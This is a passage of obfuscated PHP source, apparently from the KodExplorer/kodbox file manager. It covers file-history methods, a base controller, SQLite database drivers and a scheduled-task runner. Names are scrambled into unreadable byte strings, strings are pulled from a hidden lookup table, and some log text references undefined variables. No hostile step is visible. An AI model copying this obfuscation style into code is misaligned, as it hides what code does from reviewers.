return $this->alias($úÛéÁĞ„[2247])->where(array($úÛéÁĞ„[495] => $ÄËËé•¢))->join($“Ş£¡ˆ¢, $úÛéÁĞ„[2248])->find(); } public function removeItem($ç‹©„ëê) { $µïĞğ‹° =& $_SERVER[¡¬ıÜ ƒ]; $§•£ú½¬ = array($µïĞğ‹°[495] => $ç‹©„ëê); $˜½€˜Â = $this->where($§•£ú½¬)->find(); if ($˜½€˜Â) { $Àİİ»­è = $this->where($§•£ú½¬)->delete(); Model($µïĞğ‹°[546])->remove($˜½€˜Â[$µïĞğ‹°[543]]); return $Àİİ»­è; } return !1; } public function removeBySource($ÜùÊ³ªû) { $âèº´ =& $_SERVER[¡¬ıÜ ƒ]; if (!$ÜùÊ³ªû) { return !1; } if (!is_array($ÜùÊ³ªû)) { $ÜùÊ³ªû = array($ÜùÊ³ªû); } $ØòÏ¯ô² = array($âèº´[493] => array($âèº´[7], $ÜùÊ³ªû)); $š˜­Ğí = $this->field($âèº´[544])->where($ØòÏ¯ô²)->select(); if ($š˜­Ğí) { $this->where($ØòÏ¯ô²)->delete(); $€—à‚şş = array_to_keyvalue($š˜­Ğí, $âèº´[12], $âèº´[543]); Model($âèº´[546])->remove($€—à‚şş); } return !0; } public function setDetail($œ­¿ÕÉ», $•îˆ‘„á) { $¼‡ˆ£À =& $_SERVER[¡¬ıÜ ƒ]; return $this->where(array($¼‡ˆ£À[495] => $œ­¿ÕÉ»))->save(array($¼‡ˆ£À[2238] => $•îˆ‘„á)); } public function rollbackToItem($ù¸ïîâ, $ç«÷†¦Ú) { $·œ™ÎıÕ =& $_SERVER[¡¬ıÜ ƒ]; $Ç€ÛÈç‹ = Model($·œ™ÎıÕ[914])->sourceInfo($ù¸ïîâ); $this->addHistory($Ç€ÛÈç‹, LNG($·œ™ÎıÕ[2249])); $á…ü¶ÔÖ = $this->find($ç«÷†¦Ú); $Ó¤™ş¾š = array($·œ™ÎıÕ[543] => $á…ü¶ÔÖ[$·œ™ÎıÕ[543]], $·œ™ÎıÕ[79] => $á…ü¶ÔÖ[$·œ™ÎıÕ[79]], $·œ™ÎıÕ[88] => time(), $·œ™ÎıÕ[531] => USER_ID); Model($·œ™ÎıÕ[914])->where(array($·œ™ÎıÕ[193] => $ù¸ïîâ))->save($Ó¤™ş¾š); return $this->where(array($·œ™ÎıÕ[495] => $ç«÷†¦Ú))->delete(); } public function clearSame($Ì¥ášÃ) { $ÌÒçè¼ö =& $_SERVER[¡¬ıÜ ƒ]; $»öŠ‚Ğ = $this->listData($Ì¥ášÃ); $•íŸàÔ = array_to_keyvalue_group($»öŠ‚Ğ, $ÌÒçè¼ö[543]); $—Ãº•ú = array(); $‡¹²¨‹¶ = array(); foreach ($•íŸàÔ as $¦í²øÇ) { if (!$¦í²øÇ || count($¦í²øÇ) <= 1) { continue; } foreach ($¦í²øÇ as $ò®¨³ß€) { $—Ãº•ú[] = $ò®¨³ß€[$ÌÒçè¼ö[543]]; $‡¹²¨‹¶[] = $ò®¨³ß€[$ÌÒçè¼ö[477]]; } } if (!$‡¹²¨‹¶) { return; } $this->where(array($ÌÒçè¼ö[477] => array($ÌÒçè¼ö[7], $‡¹²¨‹¶)))->delete(); Model($ÌÒçè¼ö[546])->remove($—Ãº•ú); } public function userSpace() { $à¬•Ñ™÷ =& $_SERVER[¡¬ıÜ ƒ]; $Á©Ú“©§ = $this->tablePrefix; $·÷Ã§‹ = array($à¬•Ñ™÷[1776] => USER_ID); $Â§  Œ = "{$Á©Ú“©§}\151\x6f\137\146\x69\154\145\40\146\x69\x6c\x65\163\x20\157\156\40\146\x69\x6c\x65\x73\x2e\x66\151\154\x65\x49\104\40\x3d\x20\x68\x69\x73\x74\157\162\x79\56\146\151\x6c\x65\111\x44"; return $this->alias($à¬•Ñ™÷[2247])->where($·÷Ã§‹)->join($Â§  Œ, $à¬•Ñ™÷[2248])->sum($à¬•Ñ™÷[79]); } } goto DĞ×·‘­Ú; eÊ¬º¡¤ª¡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Â¢Ãä’ =& $_SERVER[¡¬ıÜ ƒ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Â¢Ãä’[6]] =& $config; $this->values[$Â¢Ãä’[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Â¢Ãä’[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($šºÚÕ‹Ç) { if (1 === func_num_args()) { $this->{$šºÚÕ‹Ç} = new $šºÚÕ‹Ç(); } else { $çåšóöÕ = new ReflectionClass($šºÚÕ‹Ç); $á×”ÖÀˆ = func_get_args(); array_shift($á×”ÖÀˆ); $this->{$šºÚÕ‹Ç} = $çåšóöÕ->newInstanceArgs($á×”ÖÀˆ); } return $this->{$šºÚÕ‹Ç}; } public function routeBind($Ä¥òÏİê, $ˆ¨¯œ, $³Ôšèˆ = 3) { $Áˆœ¥·´ =& $_SERVER[¡¬ıÜ ƒ]; $ñÕ¹İë« = $this->in[$Áˆœ¥·´[9]]; $Ä¥òÏİê = str_replace($Áˆœ¥·´[10], $Áˆœ¥·´[11], trim(trim($Ä¥òÏİê, $Áˆœ¥·´[8]), $Áˆœ¥·´[12])); if (!$Ä¥òÏİê || count($ñÕ¹İë«) <= $³Ôšèˆ) { return !1; } $æÜõœ°€ = !0; $èÉ²«× = explode($Áˆœ¥·´[8], $Ä¥òÏİê); for ($Ãîì ŸÇ = 0; $Ãîì ŸÇ < count($èÉ²«×); $Ãîì ŸÇ++) { if ($èÉ²«×[$Ãîì ŸÇ] != $ñÕ¹İë«[$³Ôšèˆ + $Ãîì ŸÇ]) { $æÜõœ°€ = !1; break; } } if (!$æÜõœ°€) { return; } call_user_func_array(array($this, $ˆ¨¯œ), array()); } public function routeArgs($­ßÂÅÀª = 3) { $Ãä¤İÄÅ = $this->in[$_SERVER[¡¬ıÜ ƒ][9]]; if (count($Ãä¤İÄÅ) <= $­ßÂÅÀª) { return array(); } $ËêëæÏÃ = array(); for ($ÎË¬²‚É = $­ßÂÅÀª; $ÎË¬²‚É < count($Ãä¤İÄÅ); $ÎË¬²‚É += 2) { $ËêëæÏÃ[$Ãä¤İÄÅ[$ÎË¬²‚É]] = $Ãä¤İÄÅ[$ÎË¬²‚É + 1]; $this->in[$Ãä¤İÄÅ[$ÎË¬²‚É]] = $Ãä¤İÄÅ[$ÎË¬²‚É + 1]; } return $ËêëæÏÃ; } protected function assign($×ÚÍ€Åƒ, $”±ìÂş˜) { $this->values[$×ÚÍ€Åƒ] = $”±ìÂş˜; } protected function display($ÉäüÄ) { ob_end_clean(); extract($this->values); require $this->tpl . $ÉäüÄ; } } class DbSqliteBase extends Db { public function __construct($Áää•Ë” = '') { $şûÙ‚’ô =& $_SERVER[¡¬ıÜ ƒ]; if (!extension_loaded($şûÙ‚’ô[13])) { think_exception(think_lang($şûÙ‚’ô[14]) . $şûÙ‚’ô[15]); } if (!empty($Áää•Ë”)) { if (!isset($Áää•Ë”[$şûÙ‚’ô[16]])) { $Áää•Ë”[$şûÙ‚’ô[16]] = 438; } $this->config = $Áää•Ë”; if (empty($this->config[$şûÙ‚’ô[17]])) { $this->config[$şûÙ‚’ô[17]] = array(); } } } public function connect($ãÔµÜŒğ = '', $°± ú—Ú = 0) { $úÁø¹œÄ =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($this->linkID[$°± ú—Ú])) { if (empty($ãÔµÜŒğ)) { $ãÔµÜŒğ = $this->config; } $¾ÓîÇå£ = !empty($ãÔµÜŒğ[$úÁø¹œÄ[17]][$úÁø¹œÄ[18]]) ? $ãÔµÜŒğ[$úÁø¹œÄ[17]][$úÁø¹œÄ[18]] : $this->pconnect; $ø˜ˆâÚ = $¾ÓîÇå£ ? $úÁø¹œÄ[19] : $úÁø¹œÄ[20]; $this->linkID[$°± ú—Ú] = $ø˜ˆâÚ($ãÔµÜŒğ[$úÁø¹œÄ[21]], $ãÔµÜŒğ[$úÁø¹œÄ[16]]); if (!$this->linkID[$°± ú—Ú]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$°± ú—Ú], 30000); if (1 != think_config($úÁø¹œÄ[22])) { unset($this->config); } } return $this->linkID[$°± ú—Ú]; } public function free() { $this->queryID = null; } public function query($Âú××î) { $„Öüùä‡ =& $_SERVER[¡¬ıÜ ƒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Âú××î; if ($this->queryID) { $this->free(); } think_action_status($„Öüùä‡[23], 1); think_status($„Öüùä‡[24]); $this->queryID = sqlite_query($this->_linkID, $Âú××î); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $šÜ™£¹ó = $this->getAll(); return $šÜ™£¹ó; } } public function execute($Õ»µµ÷Ÿ) { $ê­§ÚÒ÷ =& $_SERVER[¡¬ıÜ ƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Õ»µµ÷Ÿ; if ($this->queryID) { $this->free(); } think_action_status($ê­§ÚÒ÷[25], 1); think_status($ê­§ÚÒ÷[24]); $ÃÕÄå‘ = sqlite_exec($this->_linkID, $Õ»µµ÷Ÿ); $this->debug(); if (!1 === $ÃÕÄå‘) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¡¬ıÜ ƒ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $•¬ºı¬İ = sqlite_query($this->_linkID, $_SERVER[¡¬ıÜ ƒ][27]); if (!$•¬ºı¬İ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $í¦˜‡«¼ = sqlite_query($this->_linkID, $_SERVER[¡¬ıÜ ƒ][28]); if (!$í¦˜‡«¼) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÌãŠàØ = array(); if ($this->numRows > 0) { for ($€‹…‚Ö = 0; $€‹…‚Ö < $this->numRows; $€‹…‚Ö++) { $ÌãŠàØ[$€‹…‚Ö] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ÌãŠàØ; } public function getFields($æÀºÚ‘) { $Õéü–Â´ =& $_SERVER[¡¬ıÜ ƒ]; $ëÒ’¼† = $this->query($Õéü–Â´[29] . $æÀºÚ‘ . $Õéü–Â´[30]); $Ë¸èŒ = array(); if ($ëÒ’¼†) { foreach ($ëÒ’¼† as $¢Èù¶š‹ => $‰ÃêÔç©) { $Ë¸èŒ[$‰ÃêÔç©[$Õéü–Â´[31]]] = array($Õéü–Â´[32] => $‰ÃêÔç©[$Õéü–Â´[31]], $Õéü–Â´[33] => $‰ÃêÔç©[$Õéü–Â´[34]], $Õéü–Â´[35] => (bool) ($‰ÃêÔç©[$Õéü–Â´[36]] === $Õéü–Â´[12]), $Õéü–Â´[37] => $‰ÃêÔç©[$Õéü–Â´[38]], $Õéü–Â´[39] => strtolower($‰ÃêÔç©[$Õéü–Â´[40]]) == $Õéü–Â´[41], $Õéü–Â´[42] => strtolower($‰ÃêÔç©[$Õéü–Â´[43]]) == $Õéü–Â´[44]); } } return $Ë¸èŒ; } public function getTables($†¥ÓîÅ¬ = '') { $¬Å³¿ƒÓ =& $_SERVER[¡¬ıÜ ƒ]; $–Û °› = $this->query($¬Å³¿ƒÓ[45] . $¬Å³¿ƒÓ[46] . $¬Å³¿ƒÓ[47]); $ƒşëŠ¦‡ = array(); foreach ($–Û °› as $æ¶±ÑÃØ => $¿ÔæÛö½) { $ƒşëŠ¦‡[$æ¶±ÑÃØ] = current($¿ÔæÛö½); } return $ƒşëŠ¦‡; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ ¿­Úâ =& $_SERVER[¡¬ıÜ ƒ]; $Íş—£ı„ = sqlite_last_error($this->_linkID); $this->error = $Íş—£ı„ . $ ¿­Úâ[4] . sqlite_error_string($Íş—£ı„); if ($ ¿­Úâ[12] != $this->queryStr) { $this->error .= LNG($ ¿­Úâ[48]) . $this->queryStr; } think_trace($this->error, $ ¿­Úâ[12], $ ¿­Úâ[49]); return $this->error; } public function escapeString($×Å®½–) { return sqlite_escape_string($×Å®½–); } public function parseLimit($à£™ğâğ) { $ç£Ö›£Ê =& $_SERVER[¡¬ıÜ ƒ]; $ÆèçÚíƒ = $ç£Ö›£Ê[12]; if (!empty($à£™ğâğ)) { $à£™ğâğ = explode($ç£Ö›£Ê[50], $à£™ğâğ); if (count($à£™ğâğ) > 1) { $ÆèçÚíƒ .= $ç£Ö›£Ê[51] . $à£™ğâğ[1] . $ç£Ö›£Ê[52] . $à£™ğâğ[0] . $ç£Ö›£Ê[53]; } else { $ÆèçÚíƒ .= $ç£Ö›£Ê[51] . $à£™ğâğ[0] . $ç£Ö›£Ê[53]; } } return $ÆèçÚíƒ; } } class DbSqlite3Base extends Db { public function __construct($‘¦‡œ¨³ = '') { $”‚ÉßÅ‰ =& $_SERVER[¡¬ıÜ ƒ]; if (!class_exists($”‚ÉßÅ‰[54])) { think_exception(think_lang($”‚ÉßÅ‰[14]) . $”‚ÉßÅ‰[55]); } if (!empty($‘¦‡œ¨³)) { if (!isset($‘¦‡œ¨³[$”‚ÉßÅ‰[16]])) { $‘¦‡œ¨³[$”‚ÉßÅ‰[16]] = 438; } $this->config = $‘¦‡œ¨³; if (empty($this->config[$”‚ÉßÅ‰[17]])) { $this->config[$”‚ÉßÅ‰[17]] = array(); } } } public function connect($ç²ß˜¹˜ = '', $¯¬“ÏìÒ = 0) { $®ì¨Á”ù =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($this->linkID[$¯¬“ÏìÒ])) { if (empty($ç²ß˜¹˜)) { $ç²ß˜¹˜ = $this->config; } $this->linkID[$¯¬“ÏìÒ] = new SQLite3($ç²ß˜¹˜[$®ì¨Á”ù[21]]); if (!$this->linkID[$¯¬“ÏìÒ]) { think_exception($this->linkID[$¯¬“ÏìÒ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¯¬“ÏìÒ]->busyTimeout(30000); if (1 != think_config($®ì¨Á”ù[22])) { unset($this->config); } } return $this->linkID[$¯¬“ÏìÒ]; } public function free() { $this->queryID = null; } public function query($­â¿İ¤õ) { $Äî×áŸ =& $_SERVER[¡¬ıÜ ƒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $­â¿İ¤õ; if ($this->queryID) { $this->free(); } think_action_status($Äî×áŸ[23], 1); think_status($Äî×áŸ[24]); $this->queryID = $this->_linkID->query($­â¿İ¤õ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¨¦öøÛ = $this->getAll(); $this->numRows = count($¨¦öøÛ); return $¨¦öøÛ; } } public function execute($©Ê½ÉÀ) { $Èàı¨©Â =& $_SERVER[¡¬ıÜ ƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©Ê½ÉÀ; if ($this->queryID) { $this->free(); } think_action_status($Èàı¨©Â[25], 1); think_status($Èàı¨©Â[24]); $Ší–›š› = $this->_linkID->exec($©Ê½ÉÀ); $this->debug(); if (!1 === $Ší–›š›) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¡¬ıÜ ƒ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Š¹³Ñ·Ó = $this->_linkID->query($_SERVER[¡¬ıÜ ƒ][27]); if (!$Š¹³Ñ·Ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $şœâ“÷ = $this->_linkID->query($_SERVER[¡¬ıÜ ƒ][28]); if (!$şœâ“÷) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $åÕà³ ğ = array(); while ($ÖÛ¾˜Ñº = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $åÕà³ ğ[] = $ÖÛ¾˜Ñº; } $this->queryID->reset(); return $åÕà³ ğ; } public function getFields($¨ŸÒÎÊ) { $‚›Î™‡Ù =& $_SERVER[¡¬ıÜ ƒ]; $Û”áñ› = $this->query($‚›Î™‡Ù[29] . $¨ŸÒÎÊ . $‚›Î™‡Ù[30]); $—ÜÊŞ–— = array(); if ($Û”áñ›) { foreach ($Û”áñ› as $ú ù‡ => $ı¦“²ÚÆ) { $—ÜÊŞ–—[$ı¦“²ÚÆ[$‚›Î™‡Ù[32]]] = array($‚›Î™‡Ù[32] => $ı¦“²ÚÆ[$‚›Î™‡Ù[32]], $‚›Î™‡Ù[33] => $ı¦“²ÚÆ[$‚›Î™‡Ù[33]], $‚›Î™‡Ù[35] => (bool) ($ı¦“²ÚÆ[$‚›Î™‡Ù[35]] === $‚›Î™‡Ù[12]), $‚›Î™‡Ù[37] => $ı¦“²ÚÆ[$‚›Î™‡Ù[56]], $‚›Î™‡Ù[39] => (bool) $ı¦“²ÚÆ[$‚›Î™‡Ù[57]], $‚›Î™‡Ù[42] => (bool) $ı¦“²ÚÆ[$‚›Î™‡Ù[57]]); } } return $—ÜÊŞ–—; } public function getTables($­‹ÙÎï… = '') { $Ã·¹ùÇƒ =& $_SERVER[¡¬ıÜ ƒ]; $ş–¢€·· = $this->query($Ã·¹ùÇƒ[45] . $Ã·¹ùÇƒ[46] . $Ã·¹ùÇƒ[47]); $‚úÅ™Ä = array(); foreach ($ş–¢€·· as $ğ·ñ²¶ô => $°×çÁˆŸ) { $‚úÅ™Ä[$ğ·ñ²¶ô] = current($°×çÁˆŸ); } return $‚úÅ™Ä; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ö¤‡Ö˜ =& $_SERVER[¡¬ıÜ ƒ]; $this->error = $this->_linkID->lastErrorMsg(); if ($ö¤‡Ö˜[12] != $this->queryStr) { $this->error .= LNG($ö¤‡Ö˜[48]) . $this->queryStr; } think_trace($this->error, $ö¤‡Ö˜[12], $ö¤‡Ö˜[49]); return $this->error; } public function escapeString($ëˆ™„¸¡) { $Š€‰úÙ– =& $_SERVER[¡¬ıÜ ƒ]; if ($this->_linkID) { return $this->_linkID->escapeString($ëˆ™„¸¡); } return str_ireplace($Š€‰úÙ–[58], $Š€‰úÙ–[59], $ëˆ™„¸¡); } public function parseLimit($Ïº±¥) { $Èå¿ÃŠô =& $_SERVER[¡¬ıÜ ƒ]; $ÛËÂ«è  = $Èå¿ÃŠô[12]; if (!empty($Ïº±¥)) { $Ïº±¥ = explode($Èå¿ÃŠô[50], $Ïº±¥); if (count($Ïº±¥) > 1) { $ÛËÂ«è  .= $Èå¿ÃŠô[51] . $Ïº±¥[1] . $Èå¿ÃŠô[52] . $Ïº±¥[0] . $Èå¿ÃŠô[53]; } else { $ÛËÂ«è  .= $Èå¿ÃŠô[51] . $Ïº±¥[0] . $Èå¿ÃŠô[53]; } } return $ÛËÂ«è ; } } goto F¯ØñÀ®; EÕ¹ ­ˆê×: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $µ§´„×Ë =& $_SERVER[¡¬ıÜ ƒ]; if (self::valueGet($µ§´„×Ë[830]) != $µ§´„×Ë[91]) { return; } if (self::valueGet($µ§´„×Ë[1734]) == $µ§´„×Ë[91]) { $ÆõÃãŸç = self::valueGet($µ§´„×Ë[1735]); if (time() - $ÆõÃãŸç > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($µ§´„×Ë[1734], $µ§´„×Ë[91]); self::log($µ§´„×Ë[1736] . ACTION . $µ§´„×Ë[1737]); Hook::bind($µ§´„×Ë[1738], $µ§´„×Ë[1739]); $æ®¤×£Ì = 0; while (!0) { self::cacheClear(); if (self::valueGet($µ§´„×Ë[830]) != $µ§´„×Ë[91]) { self::valueSet($µ§´„×Ë[1734], $µ§´„×Ë[230]); self::log($µ§´„×Ë[1740]); die; } $ùï–Ó¥¦ = time(); if ($ùï–Ó¥¦ - $æ®¤×£Ì >= 60) { self::valueSet(array($µ§´„×Ë[1734] => $µ§´„×Ë[91], $µ§´„×Ë[1735] => $ùï–Ó¥¦)); $æ®¤×£Ì = $ùï–Ó¥¦; } if (!file_exists(USER_SYSTEM . $µ§´„×Ë[1741])) { self::valueSet(array($µ§´„×Ë[1734] => $µ§´„×Ë[230], $µ§´„×Ë[830] => $µ§´„×Ë[230])); self::log($µ§´„×Ë[1742]); die; } $¸¬‹‹“º = file_get_contents(BASIC_PATH . $µ§´„×Ë[1743]); $å‡ï’ü· = KOD_VERSION . $µ§´„×Ë[10] . KOD_VERSION_BUILD; $é•©Û§İ = match_text($¸¬‹‹“º, $µ§´„×Ë[1744]) . $µ§´„×Ë[10] . match_text($¸¬‹‹“º, $µ§´„×Ë[1745]); if ($é•©Û§İ != $å‡ï’ü·) { self::restart(); self::log("\163\164\x6f\160\x65\x64\56\x5b\x76\145\162\163\151\x6f\x6e\x20\165\x70\x64\x61\x74\x65\x3b{$versionNow}\x20\75\76\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $üåÉÂÈ =& $_SERVER[¡¬ıÜ ƒ]; http_close(); $GLOBALS[$üåÉÂÈ[1746]] = 1; $_SERVER[$üåÉÂÈ[1747]] = $üåÉÂÈ[1748]; $_COOKIE = array(); $GLOBALS[$üåÉÂÈ[1749]] = 1; $GLOBALS[$üåÉÂÈ[1750]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $¦¾›·È³ =& $_SERVER[¡¬ıÜ ƒ]; http_close(); self::valueSet($¦¾›·È³[830], $¦¾›·È³[230]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¦¾›·È³[1734] => $¦¾›·È³[230], $¦¾›·È³[830] => $¦¾›·È³[91])); self::log($¦¾›·È³[1751]); } public static function taskSwitch() { $€¯ÜÌĞ© =& $_SERVER[¡¬ıÜ ƒ]; $õÁÓò•§ = self::valueGet($€¯ÜÌĞ©[830]) == $€¯ÜÌĞ©[91] ? $€¯ÜÌĞ©[230] : $€¯ÜÌĞ©[91]; self::valueSet($€¯ÜÌĞ©[830], $õÁÓò•§); } public static function shutdownEvent() { $œÖ¥Ü‘‹ =& $_SERVER[¡¬ıÜ ƒ]; self::valueSet($œÖ¥Ü‘‹[1734], $œÖ¥Ü‘‹[230]); self::log($œÖ¥Ü‘‹[1752]); } public static function config($Ø©€÷™ı, $µöï€í) { self::valueSet($_SERVER[¡¬ıÜ ƒ][830], $Ø©€÷™ı); } private static function taskRunAll() { $†é§µ®ı =& $_SERVER[¡¬ıÜ ƒ]; $Ş‰ºğ¢Ò = timeFloat(); $Ä©æœ¶ô = Model($†é§µ®ı[1753])->listData(); $ˆôñı× = count($Ä©æœ¶ô); for ($¢¦ŒòÍ = 0; $¢¦ŒòÍ < $ˆôñı×; $¢¦ŒòÍ++) { $‰¥÷ö²à = $Ä©æœ¶ô[$¢¦ŒòÍ]; if (!$‰¥÷ö²à[$†é§µ®ı[477]] || $‰¥÷ö²à[$†é§µ®ı[1754]] != $†é§µ®ı[91]) { continue; } if (!self::taskTimeCheck($‰¥÷ö²à)) { continue; } self::taskRun($‰¥÷ö²à); } Hook::trigger($†é§µ®ı[1755]); self::taskQueueRun($Ş‰ºğ¢Ò); } private static function taskQueueRun($Ÿ”¸úé) { $îÕÈÀ¡¢ = 10; while (!0) { $©î ÆÑË = TaskQueue::run(); if ($©î ÆÑË === !1) { break; } if (timeFloat() - $Ÿ”¸úé >= $îÕÈÀ¡¢) { break; } } } private static function taskTimeCheck($ÚéØöÑÀ) { $ğáÑÌşÁ =& $_SERVER[¡¬ıÜ ƒ]; $›“ŸçÍµ = json_decode($ÚéØöÑÀ[$ğáÑÌşÁ[206]], !0); $——öûºè = intval($ÚéØöÑÀ[$ğáÑÌşÁ[1735]]); $Â¼èÖ¸ = strtotime($ğáÑÌşÁ[1756] . $›“ŸçÍµ[$ğáÑÌşÁ[1757]] . $ğáÑÌşÁ[1758]) - strtotime($ğáÑÌşÁ[1759]); $ …ğ­Ñ‰ = time() - strtotime(date($ğáÑÌşÁ[1760]) . $ğáÑÌşÁ[1761]); $‚œº²ÂØ = $ …ğ­Ñ‰ >= $Â¼èÖ¸ && $ …ğ­Ñ‰ <= $Â¼èÖ¸ + 3600; switch ($›“ŸçÍµ[$ğáÑÌşÁ[33]]) { case $ğáÑÌşÁ[1762]: if (time() - $——öûºè < 3600 * 24 * 30) { return !1; } if ($›“ŸçÍµ[$ğáÑÌşÁ[1762]] == date($ğáÑÌşÁ[1763]) && $‚œº²ÂØ) { return !0; } break; case $ğáÑÌşÁ[1764]: if (time() - $——öûºè < 3600 * 24 * 7) { return !1; } $åÈã££ï = date($ğáÑÌşÁ[1765]) == 0 ? 7 : date($ğáÑÌşÁ[1765]); if ($›“ŸçÍµ[$ğáÑÌşÁ[1764]] == $åÈã££ï && $‚œº²ÂØ) { return !0; } break; case $ğáÑÌşÁ[1757]: if (time() - $——öûºè < 3600 * 24) { return !1; } if ($‚œº²ÂØ) { return !0; } break; case $ğáÑÌşÁ[1766]: if (time() - $——öûºè >= floatval($›“ŸçÍµ[$ğáÑÌşÁ[1766]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ä·ì®Å =& $_SERVER[¡¬ıÜ ƒ]; static $Ì¾Ş¹şØ = 0; $“Àöıš = 300; if (!$Ì¾Ş¹şØ) { $Ì¾Ş¹şØ = time(); } if (time() - $Ì¾Ş¹şØ < $“Àöıš) { return; } $Ì¾Ş¹şØ = time(); $Æ¦ïØŸÕ = Model($Ä·ì®Å[579])->db($Ä·ì®Å[12]); if ($Æ¦ïØŸÕ) { $Æ¦ïØŸÕ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ä·ì®Å[1767], $Ä·ì®Å[1768]); die; } } public static function taskRun($•šÒØ˜Ò) { $É²ßØ×¢ =& $_SERVER[¡¬ıÜ ƒ]; self::log($É²ßØ×¢[1769] . $•šÒØ˜Ò[$É²ßØ×¢[477]] . $É²ßØ×¢[1770] . $•šÒØ˜Ò[$É²ßØ×¢[32]] . $É²ßØ×¢[1771] . $•šÒØ˜Ò[$É²ßØ×¢[1772]]); Model($É²ßØ×¢[1753])->run($•šÒØ˜Ò[$É²ßØ×¢[477]]); $¬Û»•Ö› = timeFloat(); $ß¶Ô¡ = $É²ßØ×¢[12]; switch ($•šÒØ˜Ò[$É²ßØ×¢[33]]) { case $É²ßØ×¢[384]: $’øø§Ä¥ = url_request($•šÒØ˜Ò[$É²ßØ×¢[1772]], $É²ßØ×¢[1507], !1, !1, !1, !1, 10); if ($’øø§Ä¥[$É²ßØ×¢[830]]) { $ß¶Ô¡ = strlen($’øø§Ä¥[$É²ßØ×¢[1298]]); } break; case $É²ßØ×¢[1773]: $ß¶Ô¡ = Hook::apply($•šÒØ˜Ò[$É²ßØ×¢[1772]]); default: break; } Model($É²ßØ×¢[1774])->add(array($É²ßØ×¢[1775] => $É²ßØ×¢[12], $É²ßØ×¢[1776] => $É²ßØ×¢[230], $É²ßØ×¢[33] => $É²ßØ×¢[1777] . $•šÒØ˜Ò[$É²ßØ×¢[477]], $É²ßØ×¢[1778] => json_encode(array($É²ßØ×¢[32] => $•šÒØ˜Ò[$É²ßØ×¢[32]], $É²ßØ×¢[1779] => timeFloat() - $¬Û»•Ö›, $É²ßØ×¢[370] => $ß¶Ô¡)))); $½õ•Ùœ = $ß¶Ô¡ ? $É²ßØ×¢[1780] . $ß¶Ô¡ : $É²ßØ×¢[12]; self::log($É²ßØ×¢[1781] . $•šÒØ˜Ò[$É²ßØ×¢[477]] . $É²ßØ×¢[178] . $½õ•Ùœ); return !0; } public static function valueGet($›®ÁÈí©) { $ˆä³…Ã =& $_SERVER[¡¬ıÜ ƒ]; $©²‹·‘× = $ˆä³…Ã[1782]; $Ïæ¼ÌÁŠ = Model($ˆä³…Ã[510])->get($›®ÁÈí©, $©²‹·‘×); if (is_null($Ïæ¼ÌÁŠ)) { Model($ˆä³…Ã[510])->set($ˆä³…Ã[830], $ˆä³…Ã[91], $©²‹·‘×); Model($ˆä³…Ã[510])->set($ˆä³…Ã[1734], $ˆä³…Ã[230], $©²‹·‘×); $Ïæ¼ÌÁŠ = Model($ˆä³…Ã[510])->get($›®ÁÈí©, $©²‹·‘×); } return $Ïæ¼ÌÁŠ; } private static function valueSet($°ğÏöòå, $Ò±ÖêÕâ = false) { $Á·È•ù³ =& $_SERVER[¡¬ıÜ ƒ]; $çšş¥èĞ = $Á·È•ù³[1783]; CacheLock::lock($çšş¥èĞ); $ğº“«Ü = Model($Á·È•ù³[510])->set($°ğÏöòå, $Ò±ÖêÕâ, $Á·È•ù³[1782]); CacheLock::unlock($çšş¥èĞ); return $ğº“«Ü; } protected static function log($òÓĞú¸) { write_log($òÓĞú¸, $_SERVER[¡¬ıÜ ƒ][1768]); } private static function cacheClear() { $º»İÉ‘¿ =& $_SERVER[¡¬ıÜ ƒ]; Cache::clearMemory(Model($º»İÉ‘¿[510])->cacheKey($º»İÉ‘¿[1782])); Cache::clearMemory(Model($º»İÉ‘¿[510])->cacheKey($º»İÉ‘¿[1784])); Model($º»İÉ‘¿[1753])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = 